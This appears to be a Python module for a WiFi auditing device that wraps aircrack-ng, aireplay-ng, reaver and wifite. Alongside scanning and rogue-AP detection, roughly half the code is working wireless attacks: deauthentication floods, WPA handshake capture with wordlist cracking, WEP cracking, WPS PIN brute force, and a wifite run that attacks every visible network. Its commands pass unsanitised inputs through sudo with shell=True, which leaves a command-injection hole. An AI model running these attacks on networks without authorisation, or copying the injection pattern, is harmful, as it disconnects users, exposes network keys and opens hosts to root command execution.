#!/usr/bin/env python3
"""
WiFi Module - Controls Alfa AWUS036ACS (RTL8811AU)
Monitor Mode, Packet Capture, Security Auditing & Attacks
"""

import os
import re
import time
import json
import signal
import subprocess
from datetime import datetime
from config import CAPTURES_DIR


class WiFiModule:
    """Wi-Fi scanning, monitor mode, packet capture, deauth, and attacks."""

    def __init__(self, interface='wlan1'):
        self.interface = interface
        self.monitor_interface = interface  # Same interface, iw changes the mode
        os.makedirs(CAPTURES_DIR, exist_ok=True)

    def _run(self, cmd, timeout=30):
        """Run a shell command with sudo. Returns (stdout, stderr, returncode)."""
        try:
            result = subprocess.run(
                f'sudo -n {cmd}', shell=True, capture_output=True, text=True,
                timeout=timeout,
            )
            return result.stdout, result.stderr, result.returncode
        except subprocess.TimeoutExpired:
            return '', 'Command timed out', 1
        except Exception as e:
            return '', str(e), 1

    # ------------------------------------------------------------------
    # Scanning (enriched with risk and encryption details)
    # ------------------------------------------------------------------

    def scan_networks(self):
        """Scan for WiFi networks using wpa_cli on wlan1. Returns list with risk and encryption."""
        if not os.path.exists('/sys/class/net/wlan1'):
            return None

        subprocess.run(['sudo', '-n', 'ip', 'link', 'set', 'wlan1', 'up'],
                       capture_output=True)

        wpa_active = subprocess.run(
            ['systemctl', 'is-active', '--quiet', 'wpa_supplicant@wlan1']
        ).returncode == 0
        if not wpa_active:
            subprocess.run(
                ['sudo', '-n', 'systemctl', 'start', 'wpa_supplicant@wlan1'],
                capture_output=True,
            )
            time.sleep(2)

        networks = []
        try:
            for _ in range(3):
                result = subprocess.run(
                    ['sudo', '-n', 'wpa_cli', '-i', 'wlan1', 'scan'],
                    capture_output=True, text=True, timeout=5,
                )
                if 'OK' in result.stdout:
                    time.sleep(3)
                    break
                if 'FAIL-BUSY' in result.stdout:
                    time.sleep(1)
                    continue
                time.sleep(1)

            output = subprocess.check_output(
                ['sudo', '-n', 'wpa_cli', '-i', 'wlan1', 'scan_results'],
                text=True, stderr=subprocess.DEVNULL, timeout=10,
            )

            for line in output.split('\n'):
                parts = line.split('\t')
                if len(parts) < 5:
                    continue
                bssid = parts[0].strip()
                if not re.match(r'^[0-9a-fA-F:]{17}$', bssid):
                    continue

                try:
                    freq = int(parts[1].strip())
                    signal = int(parts[2].strip())
                except ValueError:
                    continue

                flags = parts[3].strip()
                ssid = parts[4].strip() if len(parts) > 4 else '(hidden)'

                encryption, risk = self._classify_security(flags)

                channel = None
                if 2412 <= freq <= 2484:
                    channel = (freq - 2412) // 5 + 1
                elif 5180 <= freq <= 5885:
                    channel = (freq - 5180) // 5 + 36

                networks.append({
                    'bssid': bssid.upper(),
                    'ssid': ssid,
                    'signal_dbm': signal,
                    'channel': channel,
                    'security': encryption,
                    'risk': risk,
                    'flags': flags,
                })
        except Exception:
            pass

        seen = {}
        for net in networks:
            ssid = net.get('ssid', '')
            if not ssid:
                continue
            if ssid not in seen or net.get('signal_dbm', -100) > seen[ssid].get('signal_dbm', -100):
                if ssid in seen and not seen[ssid].get('security') and net.get('security'):
                    seen[ssid]['security'] = net['security']
                    seen[ssid]['risk'] = net['risk']
                else:
                    seen[ssid] = net

        return sorted(seen.values(), key=lambda x: x.get('signal_dbm', -100), reverse=True)

    @staticmethod
    def _classify_security(flags):
        """Parse wpa_cli flags into (encryption_label, risk_level)."""
        flags_upper = flags.upper()
        risk = 'low'
        encryption = 'Unknown'

        # Check encryption type
        if 'WPA3' in flags_upper or 'SAE' in flags_upper:
            encryption = 'WPA3'
            risk = 'none'
        elif 'WPA2' in flags_upper:
            encryption = 'WPA2'
            risk = 'low'
        elif 'WPA-' in flags_upper or 'WPA ' in flags_upper:
            encryption = 'WPA'
            risk = 'high'
        elif 'WEP' in flags_upper:
            encryption = 'WEP'
            risk = 'critical'
        elif 'ESS' in flags_upper or not flags_upper or flags_upper == '[ESS]':
            encryption = 'OPEN'
            risk = 'critical'

        # Refine: cipher type
        if 'TKIP' in flags_upper:
            encryption += '+TKIP'
            risk = 'high' if risk != 'critical' else 'critical'
        elif 'CCMP' in flags_upper or 'AES' in flags_upper:
            encryption += '+CCMP'

        # Refine: WPS enabled
        if 'WPS' in flags_upper:
            encryption += '+WPS'
            if risk == 'low':
                risk = 'medium'

        # Hidden SSID
        if '[ESS' in flags and not flags_upper.startswith('[WPA'):
            pass  # ESS alone = open network

        return encryption, risk

    # ------------------------------------------------------------------
    # Monitor mode & packet capture
    # ------------------------------------------------------------------

    def start_monitor_mode(self):
        """
        Enter monitor mode on wlan1 using iw (no airmon-ng).
        airmon-ng check kill would kill gunicorn+hostapd -- avoided.
        """
        if not os.path.exists('/sys/class/net/wlan1'):
            return {'success': False,
                    'error': 'Alfa WiFi adapter (wlan1) not found'}

        had_connection = False
        if os.path.exists('/var/run/wpa_supplicant/wlan1'):
            had_connection = True

        # Stop WiFi client, flush, set monitor mode via iw
        subprocess.run(
            ['sudo', '-n', 'systemctl', 'stop', 'wpa_supplicant@wlan1'],
            capture_output=True,
        )
        subprocess.run(
            ['sudo', '-n', 'ip', 'link', 'set', self.interface, 'down'],
            capture_output=True,
        )
        subprocess.run(
            ['sudo', '-n', 'iw', 'dev', self.interface, 'set', 'type', 'monitor'],
            capture_output=True,
        )
        subprocess.run(
            ['sudo', '-n', 'ip', 'link', 'set', self.interface, 'up'],
            capture_output=True,
        )

        # Verify
        result = subprocess.run(
            ['iwconfig', self.interface],
            capture_output=True, text=True, timeout=10,
        )
        success = result.returncode == 0 and 'Mode:Monitor' in result.stdout
        self.monitor_interface = self.interface  # Use wlan1 directly

        return {'success': success,
                'interface': self.interface if success else None,
                'was_connected': had_connection}

    def stop_monitor_mode(self):
        """Return wlan1 to managed mode and restart WiFi client if needed."""
        subprocess.run(
            ['sudo', '-n', 'ip', 'link', 'set', self.interface, 'down'],
            capture_output=True,
        )
        subprocess.run(
            ['sudo', '-n', 'iw', 'dev', self.interface, 'set', 'type', 'managed'],
            capture_output=True,
        )
        subprocess.run(
            ['sudo', '-n', 'ip', 'link', 'set', self.interface, 'up'],
            capture_output=True,
        )
        # Restart wpa_supplicant to reconnect
        subprocess.run(
            ['sudo', '-n', 'systemctl', 'start', 'wpa_supplicant@wlan1'],
            capture_output=True,
        )
        return {'success': True, 'interface': self.interface}

    def _is_monitor_mode(self):
        result = subprocess.run(
            ['iwconfig', self.interface],
            capture_output=True, text=True, timeout=10,
        )
        return result.returncode == 0 and 'Mode:Monitor' in result.stdout

    # --- Filter presets for capture ---

    _FILTER_PRESETS = {
        'beacons': 'wlan type mgt subtype beacon',
        'probes': 'wlan type mgt subtype probe-req',
        'management': 'wlan type mgt',
        'data': 'wlan type data',
        'control': 'wlan type ctl',
    }

    def capture_packets(self, duration=60, channel=None, packet_filter=None):
        """
        Capture packets to pcap file with optional BPF filter.
        packet_filter: preset name ('beacons', 'probes', etc.) or raw tcpdump expression.
        """
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f'capture_{timestamp}.pcap'
        filepath = os.path.join(CAPTURES_DIR, filename)

        if not self._is_monitor_mode():
            result = self.start_monitor_mode()
            if not result['success']:
                return {'success': False, 'error': 'Failed to enter monitor mode'}
        interface = self.monitor_interface

        cmd = f'timeout {duration} tcpdump -i {interface} -w {filepath}'
        if channel:
            cmd = f'iwconfig {interface} channel {channel} && ' + cmd

        # Apply filter
        filter_str = self._FILTER_PRESETS.get(packet_filter, packet_filter)
        if filter_str:
            cmd += f' "{filter_str}"'

        self._run(cmd)

        file_exists = os.path.exists(filepath)
        file_size = os.path.getsize(filepath) if file_exists else 0

        return {'success': file_exists, 'filename': filename, 'filepath': filepath,
                'size_bytes': file_size, 'duration': duration, 'channel': channel,
                'filter': packet_filter}

    # ------------------------------------------------------------------
    # Probe request capture (issue #13)
    # ------------------------------------------------------------------

    def capture_probes(self, duration=30):
        """Capture 802.11 probe requests using tshark. Returns list of client/SSID pairs."""
        if not self._is_monitor_mode():
            result = self.start_monitor_mode()
            if not result['success']:
                return {'success': False,
                        'error': f'Failed to enter monitor mode on {self.interface}'}

        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        outfile = os.path.join(CAPTURES_DIR, f'probes_{timestamp}.csv')

        cmd = (
            f'timeout {duration} tshark -i {self.monitor_interface} '
            f'-Y "wlan.fc.type_subtype == 4" '
            f'-T fields -e wlan.sa -e wlan.ssid -E separator=,'
        )

        stdout, stderr, rc = self._run(cmd, timeout=duration + 10)

        probes = []
        seen = set()
        for line in stdout.strip().split('\n'):
            line = line.strip()
            if not line or ',' not in line:
                continue
            parts = line.split(',', 1)
            mac = parts[0].strip()
            ssid = parts[1].strip() if len(parts) > 1 else ''
            if mac and re.match(r'^[0-9a-fA-F:]{17}$', mac):
                key = f'{mac}:{ssid}'
                if key not in seen:
                    seen.add(key)
                    probes.append({'client_mac': mac.upper(), 'ssid': ssid,
                                   'timestamp': datetime.now().isoformat()})

        # Save raw output
        with open(outfile, 'w') as f:
            f.write(stdout)

        return {'success': True, 'probes': probes, 'count': len(probes),
                'duration': duration, 'file': outfile}

    # ------------------------------------------------------------------
    # Deauth attack (existing, now with endpoint)
    # ------------------------------------------------------------------

    def deauth_attack(self, bssid, client=None, count=5, channel=None):
        """Send deauthentication frames via aireplay-ng."""
        if not self._is_monitor_mode():
            result = self.start_monitor_mode()
            if not result['success']:
                return {'success': False, 'error': 'Failed to enter monitor mode'}

        # Lock to the correct channel (critical for deauth to work)
        if channel:
            self._run(f'iwconfig {self.monitor_interface} channel {channel}')
        else:
            # Auto-lock: listen for a beacon, then deauth
            self._run(f'iwconfig {self.monitor_interface} channel 0')

        # Try targeted deauth first if client specified, then broadcast
        if client:
            cmd = f'aireplay-ng -0 {count} -a {bssid} -c {client} {self.monitor_interface}'
        else:
            cmd = f'aireplay-ng -0 {count} -a {bssid} {self.monitor_interface}'
        stdout, stderr, rc = self._run(cmd)
        return {'success': rc == 0, 'bssid': bssid, 'client': client,
                'frames_sent': count, 'output': stdout}

    # ------------------------------------------------------------------
    # Handshake capture (aircrack-ng)
    # ------------------------------------------------------------------

    def capture_handshake(self, bssid, channel, timeout=60):
        """Capture WPA handshake by deauth-ing a client, then waiting for reconnection."""
        if not self._is_monitor_mode():
            result = self.start_monitor_mode()
            if not result['success']:
                return {'success': False,
                        'error': f'Failed to enter monitor mode on {self.interface}'}

        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        outfile = os.path.join('/tmp', f'handshake_{timestamp}')

        # Set channel
        self._run(f'iwconfig {self.monitor_interface} channel {channel}')

        # Start airodump-ng in background
        cmd = (
            f'timeout {timeout} airodump-ng -c {channel} '
            f'--bssid {bssid} -w {outfile} {self.monitor_interface}'
        )
        proc = subprocess.Popen(
            cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
        )

        time.sleep(2)
        # Send deauth to force handshake
        self._run(f'aireplay-ng -0 3 -a {bssid} {self.monitor_interface}')
        time.sleep(3)
        self._run(f'aireplay-ng -0 3 -a {bssid} {self.monitor_interface}')

        try:
            stdout, stderr = proc.communicate(timeout=timeout + 5)
        except subprocess.TimeoutExpired:
            proc.kill()
            stdout, stderr = proc.communicate()

        # Check if handshake was captured
        cap_file = f'{outfile}-01.cap'
        if os.path.exists(cap_file):
            # Verify with aircrack-ng
            check, _, _ = self._run(f'aircrack-ng {cap_file} 2>&1 | grep -c "handshake"')
            return {'success': True, 'file': cap_file, 'bssid': bssid,
                    'channel': channel, 'has_handshake': '1' in check if check else False}

        return {'success': False, 'error': 'No handshake captured',
                'bssid': bssid, 'channel': channel}

    # ------------------------------------------------------------------
    # Wifite-based auditing (Kali's wireless auditor - scan + attack)
    # ------------------------------------------------------------------

    def run_wifite_audit(self, scan_time=10, attack_time=300):
        """Run wifite full audit: scan then automatically attack all targets.
        Uses detached process to survive gunicorn worker death from airmon-ng."""
        tmpfile = f'/tmp/wifite_audit_{os.getpid()}.txt'
        cmd = (
            f'sudo -n script -q -c "wifite -i {self.interface} --wpa --wps --wep '
            f'--clients-only -p {scan_time} --daemon" {tmpfile}'
        )
        proc = subprocess.Popen(
            cmd, shell=True, start_new_session=True,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        try:
            proc.wait(timeout=scan_time + attack_time + 30)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()

        try:
            with open(tmpfile, 'r', errors='replace') as f:
                output = f.read()
        except (IOError, OSError):
            output = ''
        subprocess.run(['sudo', '-n', 'rm', '-f', tmpfile], capture_output=True)

        targets = self._parse_wifite_output(output)
        cracked = self._read_wifite_cracked()

        return {
            'targets': targets,
            'cracked': cracked,
            'summary': self._parse_wifite_summary(output),
        }

    def run_wifite_scan_only(self, scan_time=10):
        """Run wifite scan without attacking. Returns target list.
        Uses detached process to survive gunicorn worker death from airmon-ng."""
        tmpfile = f'/tmp/wifite_scan_{os.getpid()}.txt'
        # script writes the pseudo-terminal output to the typescript file.
        # Pass the tmpfile as the typescript target (not /dev/null).
        cmd = (
            f'sudo -n script -q -c "wifite -i {self.interface} --wpa --wps --wep '
            f'--skip-crack --clients-only -p {scan_time} --daemon" {tmpfile}'
        )
        proc = subprocess.Popen(
            cmd, shell=True, start_new_session=True,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        try:
            proc.wait(timeout=scan_time + 25)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()

        # Read the output file (created by root via sudo)
        try:
            with open(tmpfile, 'r', errors='replace') as f:
                output = f.read()
        except (IOError, OSError):
            output = ''
        subprocess.run(['sudo', '-n', 'rm', '-f', tmpfile], capture_output=True)
        return self._parse_wifite_output(output)

    @staticmethod
    def _read_wifite_cracked():
        """Read wifite's cracked.json file if it exists."""
        for path in ['/root/cracked.json', os.path.expanduser('~/.wifite/cracked.json')]:
            if os.path.exists(path):
                try:
                    with open(path) as f:
                        return json.load(f)
                except (json.JSONDecodeError, IOError):
                    pass
        return []

    @staticmethod
    def _parse_wifite_summary(output):
        """Extract attack result summary from wifite output."""
        clean = WiFiModule._strip_ansi(output)
        lines = clean.split('\n')
        summary = {'attacked': 0, 'cracked': 0, 'handshakes': 0}
        for line in lines:
            if 'cracked' in line.lower() or 'KEY' in line:
                summary['cracked'] += 1
            if 'handshake' in line.lower():
                summary['handshakes'] += 1
        return summary

    @staticmethod
    def _strip_ansi(text):
        """Remove ANSI escape sequences and terminal control chars from text."""
        import re as _re
        return _re.sub(r'\x1b\[[0-9;]*[a-zA-Z]|\x1b\].*?\x07|\r', '', text)

    @staticmethod
    def _parse_wifite_output(output):
        """Parse wifite terminal output into structured target list.
        Wifite uses fixed-width columns: NUM(4) ESSID(27) CH(4) ENCR(7) PWR(6) WPS(4) CLIENT"""
        clean = WiFiModule._strip_ansi(output)
        targets = []
        seen = set()
        for line in clean.split('\n'):
            stripped = line.strip()
            if not stripped or not stripped[0].isdigit():
                continue
            try:
                num = int(stripped[0])
            except ValueError:
                continue
            # Parse rest of line by fixed positions after the number
            rest = stripped[2:]  # Skip "NUM "
            # ESSID is columns 0-26, CH 27-30, ENCR 31-37, PWR 38-44, WPS 45-49, CLIENT 50+
            essid = rest[0:27].strip()
            ch = rest[27:31].strip()
            encr = rest[31:39].strip()
            pwr = rest[39:46].strip()
            wps = rest[46:52].strip() if len(rest) > 46 else 'no'
            clients = rest[52:].strip() if len(rest) > 52 else '0'
            if essid and essid not in seen:
                seen.add(essid)
                targets.append({
                    'num': num,
                    'essid': essid.rstrip('*'),
                    'channel': ch,
                    'encryption': encr,
                    'power': pwr,
                    'wps': wps,
                    'clients': clients.split()[0] if clients else '0',
                })
        return targets

    # ------------------------------------------------------------------
    # Attack viability checker (dynamic, no hardcoded assumptions)
    # ------------------------------------------------------------------

    def check_attack_viability(self, bssid, channel, security):
        """Quick non-destructive probes to determine which attacks are viable."""
        results = {
            'deauth': {'viable': False, 'reason': ''},
            'wpa': {'viable': False, 'reason': ''},
            'wps': {'viable': False, 'reason': ''},
            'wep': {'viable': False, 'reason': ''},
        }

        enc_lower = (security or '').lower()
        has_wpa = 'wpa' in enc_lower and 'wpa3' not in enc_lower
        has_wps = 'wps' in enc_lower
        has_wep = 'wep' in enc_lower
        is_open = 'open' in enc_lower

        # --- WEP ---
        if has_wep:
            results['wep'] = {'viable': True,
                              'reason': 'WEP encryption detected. Crackable in minutes via aircrack-ng.'}
        else:
            results['wep'] = {'viable': False,
                              'reason': 'Network does not use WEP encryption.'}

        # --- Deauth ---
        # Check for PMF (802.11w) by looking for MFP/PMF in RSN flags from scan
        # We test viability by checking if we can receive beacons on target channel
        if not self._is_monitor_mode():
            self.start_monitor_mode()

        # Tune to channel and check for beacon
        self._run(f'iwconfig {self.monitor_interface} channel {channel}')
        stdout, _, rc = self._run(
            f'timeout 3 airodump-ng --bssid {bssid} -c {channel} {self.monitor_interface} -w /tmp/viability_check 2>&1',
            timeout=8,
        )

        # Check for PMF indicators in the capture
        pmf_likely = False
        cap_file = '/tmp/viability_check-01.cap'
        if os.path.exists(cap_file):
            # Look for RSN PMF cap in beacon
            check, _, _ = self._run(
                f'tshark -r {cap_file} -Y "wlan.fc.type_subtype == 8" '
                f'-T fields -e wlan.rsn.capabilities 2>/dev/null',
                timeout=5,
            )
            # PMF required = bit 7, PMF capable = bit 6
            if check.strip():
                try:
                    caps = [int(c, 16) for c in check.strip().split('\n') if c.strip()]
                    for cap in caps:
                        if cap & 0x40:  # Management Frame Protection Capable
                            pmf_likely = True
                            break
                except (ValueError, TypeError):
                    pass
            # Also check if handshake appears to have PMF
            check2, _, _ = self._run(
                f'tshark -r {cap_file} -Y "eapol" 2>/dev/null | wc -l',
                timeout=5,
            )
            subprocess.run(['sudo', '-n', 'rm', '-f', cap_file], capture_output=True)

        # Clean up leftover files (airodump-ng creates them as root via sudo)
        for f in ['/tmp/viability_check-01.csv', '/tmp/viability_check-01.kismet.csv',
                  '/tmp/viability_check-01.log', '/tmp/viability_check-01.kismet.netxml']:
            if os.path.exists(f):
                subprocess.run(['sudo', '-n', 'rm', '-f', f], capture_output=True)

        if pmf_likely:
            results['deauth'] = {'viable': False,
                                 'reason': 'PMF (802.11w) blocks deauth frames.'}
        else:
            results['deauth'] = {'viable': True,
                                 'reason': 'Deauth frames sendable. Modern clients reconnect within ms; IoT devices disconnect visibly.'}

        # --- WPA handshake crack ---
        if not has_wpa:
            results['wpa'] = {'viable': False,
                              'reason': 'Not a WPA/WPA2 network.'}
        elif pmf_likely:
            results['wpa'] = {'viable': False,
                              'reason': 'PMF (802.11w) blocks handshake capture.'}
        else:
            results['wpa'] = {'viable': True,
                              'reason': 'Handshake capture possible via deauth. Cracked only if password is in wordlist.'}

        # --- WPS PIN attack ---
        if has_wps:
            # Quick test: try a WPS transaction with a 5s timeout
            test, _, _ = self._run(
                f'timeout 8 reaver -i {self.monitor_interface} -b {bssid} -c {channel} -vv 2>&1 | head -15',
                timeout=12,
            )
            if 'rate limiting' in test.lower() or 'waiting 60 seconds' in test.lower():
                results['wps'] = {'viable': False,
                                  'reason': 'WPS rate-limited. Attack would take hours/days.'}
            elif 'WPS' in test or 'PIN' in test:
                results['wps'] = {'viable': True,
                                  'reason': 'WPS appears responsive. PIN attack may succeed.'}
            else:
                results['wps'] = {'viable': False,
                                  'reason': 'WPS not responding or locked.'}
        else:
            results['wps'] = {'viable': False,
                              'reason': 'WPS not enabled on this network.'}

        return results

    # ------------------------------------------------------------------
    # Rogue AP detection (issue #14)
    # ------------------------------------------------------------------

    def detect_anomalies(self, networks):
        """Detect potential rogue APs and attacks from scan results."""
        if networks is None:
            return {'success': False, 'error': 'No scan data available'}

        anomalies = []

        # Group by SSID to find duplicates
        by_ssid = {}
        for net in networks:
            ssid = net.get('ssid', '')
            if not ssid or ssid == '(hidden)':
                continue
            by_ssid.setdefault(ssid, []).append(net)

        # Duplicate SSID detection (evil twin)
        for ssid, nets in by_ssid.items():
            if len(nets) > 1:
                bssids = [n['bssid'] for n in nets]
                signals = [n.get('signal_dbm', -100) for n in nets]
                anomalies.append({
                    'type': 'duplicate_ssid',
                    'severity': 'high',
                    'ssid': ssid,
                    'bssids': bssids,
                    'signals': signals,
                    'description': (
                        f'SSID "{ssid}" seen with {len(nets)} different BSSIDs '
                        f'({", ".join(bssids)}). Possible Evil Twin attack.'
                    ),
                })

        # Encryption downgrade detection
        for ssid, nets in by_ssid.items():
            encryptions = {n.get('security', '') for n in nets}
            if 'OPEN' in encryptions and any('WPA' in e for e in encryptions):
                anomalies.append({
                    'type': 'encryption_downgrade',
                    'severity': 'critical',
                    'ssid': ssid,
                    'encryptions_seen': list(encryptions),
                    'description': (
                        f'SSID "{ssid}" seen with both OPEN and encrypted modes. '
                        f'Possible active Evil Twin with encryption stripped.'
                    ),
                })

        # Suspicious signal strength
        for ssid, nets in by_ssid.items():
            for net in nets:
                if net.get('signal_dbm', -100) > -30:
                    anomalies.append({
                        'type': 'strong_signal',
                        'severity': 'medium',
                        'ssid': ssid,
                        'bssid': net['bssid'],
                        'signal_dbm': net['signal_dbm'],
                        'description': (
                            f'SSID "{ssid}" ({net["bssid"]}) has very strong signal '
                            f'({net["signal_dbm"]} dBm). Possible attacker nearby.'
                        ),
                    })

        return {'success': True, 'anomalies': anomalies, 'count': len(anomalies)}

    # ------------------------------------------------------------------
    # WEP attack (aircrack-ng)
    # ------------------------------------------------------------------

    def attack_wep(self, bssid, channel, timeout=120):
        """Automated WEP cracking using airodump-ng + aireplay-ng + aircrack-ng."""
        if not self._is_monitor_mode():
            result = self.start_monitor_mode()
            if not result['success']:
                return {'success': False,
                        'error': f'Failed to enter monitor mode on {self.interface}'}

        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        outfile = os.path.join('/tmp', f'wep_{timestamp}')

        self._run(f'iwconfig {self.monitor_interface} channel {channel}')

        # Start capture in background
        cap_proc = subprocess.Popen(
            f'timeout {timeout} airodump-ng -c {channel} --bssid {bssid} '
            f'-w {outfile} {self.monitor_interface}',
            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )

        time.sleep(2)
        # Fake auth and ARP replay to generate traffic
        self._run(f'aireplay-ng -1 0 -a {bssid} {self.monitor_interface}')
        self._run(f'aireplay-ng -3 -b {bssid} {self.monitor_interface}')

        try:
            cap_proc.wait(timeout=timeout + 10)
        except subprocess.TimeoutExpired:
            cap_proc.kill()

        # Try to crack
        cap_file = f'{outfile}-01.cap'
        if os.path.exists(cap_file):
            stdout, _, _ = self._run(f'aircrack-ng -a 1 {cap_file} -l /tmp/wep_key_{timestamp}.txt')
            key_file = f'/tmp/wep_key_{timestamp}.txt'
            if os.path.exists(key_file):
                with open(key_file) as f:
                    key = f.read().strip()
                key_fmt = ':'.join(key[i:i+2] for i in range(0, len(key), 2)) if ':' not in key else key
                return {'success': True, 'key': key_fmt, 'file': cap_file, 'bssid': bssid}

            # Check if key is in aircrack output
            match = re.search(r'KEY FOUND!.*?\[ ([\da-fA-F:]+) \]', stdout)
            if match:
                return {'success': True, 'key': match.group(1), 'file': cap_file, 'bssid': bssid}

        return {'success': False, 'error': 'Could not crack WEP key. Try capturing more IVs.',
                'file': cap_file, 'bssid': bssid}

    # ------------------------------------------------------------------
    # WPA handshake crack (aircrack-ng + wordlist)
    # ------------------------------------------------------------------

    def attack_wpa(self, bssid, channel, wordlist='/usr/share/wordlists/rockyou.txt',
                   timeout=90):
        """Capture WPA handshake and crack with wordlist."""
        # First, capture the handshake
        hs_result = self.capture_handshake(bssid, channel, timeout=60)
        if not hs_result.get('success') or not hs_result.get('has_handshake'):
            return {'success': False,
                    'error': hs_result.get('error', 'Failed to capture handshake'),
                    'handshake_result': hs_result}

        cap_file = hs_result['file']

        # Crack with aircrack-ng
        stdout, _, _ = self._run(
            f'aircrack-ng -w {wordlist} -b {bssid} -l /tmp/wpa_key_{os.path.basename(cap_file)}.txt {cap_file}'
        )

        key_file = f'/tmp/wpa_key_{os.path.basename(cap_file)}.txt'
        if os.path.exists(key_file):
            with open(key_file) as f:
                key = f.read().strip()
            if key:
                return {'success': True, 'key': key, 'file': cap_file, 'bssid': bssid}

        # Check aircrack output for key
        match = re.search(r'KEY FOUND!.*?\[ (.+?) \]', stdout)
        if match:
            return {'success': True, 'key': match.group(1), 'file': cap_file, 'bssid': bssid}

        return {'success': False,
                'error': 'Handshake captured but password not in wordlist.',
                'file': cap_file, 'bssid': bssid}

    # ------------------------------------------------------------------
    # WPS PIN attack (reaver)
    # ------------------------------------------------------------------

    def attack_wps(self, bssid, channel, timeout=300):
        """WPS PIN brute force using reaver."""
        if not self._is_monitor_mode():
            result = self.start_monitor_mode()
            if not result['success']:
                return {'success': False,
                        'error': f'Failed to enter monitor mode on {self.interface}'}

        self._run(f'iwconfig {self.monitor_interface} channel {channel}')

        stdout, stderr, rc = self._run(
            f'timeout {timeout} reaver -i {self.monitor_interface} '
            f'-b {bssid} -c {channel} -vv',
            timeout=timeout + 10,
        )

        # Parse reaver output for PIN and PSK
        pin_match = re.search(r'WPS PIN:\s*[\'\"]?(\d{8})[\'\"]?', stdout)
        psk_match = re.search(r'WPA PSK:\s*[\'\"]?(.+?)[\'\"]?\n', stdout)

        if pin_match:
            result = {'success': True, 'pin': pin_match.group(1), 'bssid': bssid}
            if psk_match:
                result['psk'] = psk_match.group(1)
            return result

        # Check for partial progress
        if 'WPS transaction failed' in stdout:
            return {'success': False,
                    'error': 'WPS locked or rate-limited. Try again later.', 'bssid': bssid}

        return {'success': False, 'error': 'WPS PIN not found in time window.',
                'output_tail': stdout[-500:], 'bssid': bssid}
